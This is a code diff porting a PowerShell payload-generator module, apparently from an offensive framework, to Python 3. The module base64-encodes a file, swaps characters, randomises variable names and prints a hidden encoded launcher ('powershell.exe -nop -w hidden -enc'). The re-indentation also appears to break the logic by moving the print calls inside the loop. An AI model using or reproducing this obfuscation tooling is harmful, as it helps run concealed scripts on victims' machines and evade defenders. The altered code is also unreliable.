@@ -1,4 +1,4 @@
-from module import ModuleObject
+from module.gen import ModuleObject
 import base64
 import os
 import time
@@ -29,11 +29,11 @@ class PsModule(ModuleObject):
         stage1 = self.read_file(path).replace("A", "!")
         self.delete_file(path)
         stage2 = self.load_file("core/util/base64.ps1").replace("[BASE64]", stage1)
-	for i in range(1,3):
-		stage2 = stage2.replace("VAR" + str(i), self.gen_str(random.randrange(3, 10)))
-		
-        self.ui.print_msg("Powershell script:")
-        print "powershell.exe -nop -w hidden -enc %s" % self.convert_to_unicode(stage2)
+        for i in range(1,3):
+            stage2 = stage2.replace("VAR" + str(i), self.gen_str(random.randrange(3, 10)))
+            
+            self.ui.print_msg("Powershell script:")
+            print("powershell.exe -nop -w hidden -enc %s" % self.convert_to_unicode(stage2))
         
     def gen_str(self, size):
         return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size)) 
@@ -66,4 +66,4 @@ class PsModule(ModuleObject):
         os.unlink(path)
         
     def read_file(self, path):
-	return base64.b64encode(open(path, "rb").read())
+        return base64.b64encode(open(path, "rb").read())
